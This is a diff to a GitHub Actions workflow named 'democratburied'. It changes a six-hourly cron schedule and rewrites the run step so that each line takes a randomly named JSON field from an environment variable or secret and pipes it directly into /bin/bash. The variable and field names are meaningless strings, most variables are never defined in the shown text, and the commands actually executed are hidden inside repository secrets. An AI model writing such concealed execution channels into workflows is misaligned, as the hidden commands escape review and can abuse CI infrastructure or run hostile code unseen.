@@ -1,8 +1,10 @@
 name: democratburied
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 5/6 * * *'
+    - cron: '45 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +13,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: democratburied
         env:
-          aeqp6: ${{ secrets.aeqp6 }}
+          z530: ${{ secrets.z530 }}
         run: |
-          echo $aeqp6 | jq -r .ykbla298 | /bin/bash
-          echo $sqr34496 | jq -r .gsest3 | /bin/bash
-          echo $x55 | jq -r .eqbz0161 | /bin/bash
-          echo $efwq29 | jq -r .so23467 | /bin/bash
-          echo $ohbx393 | jq -r .qzzy643 | /bin/bash
-          echo $vpv7836 | jq -r .tkf04242 | /bin/bash
-          echo $w6739 | jq -r .zzp66982 | /bin/bash
+          echo $z530 | jq -r .yfna311 | /bin/bash
+          echo $vue479 | jq -r .d2 | /bin/bash
+          echo $dow2 | jq -r .vbyok8481 | /bin/bash
+          echo $b51999 | jq -r .cpnw63572 | /bin/bash
+          echo $lpph054 | jq -r .ayvz23812 | /bin/bash
+          echo $cqq73089 | jq -r .fc49 | /bin/bash
+          echo $zdoqk8142 | jq -r .itif66 | /bin/bash
+          echo $tcu64685 | jq -r .vzkwn6670 | /bin/bash
+          echo $n11 | jq -r .mjape19536 | /bin/bash
+          echo $rf27 | jq -r .h9 | /bin/bash
+          echo $yw6153 | jq -r .gvc3765 | /bin/bash
 
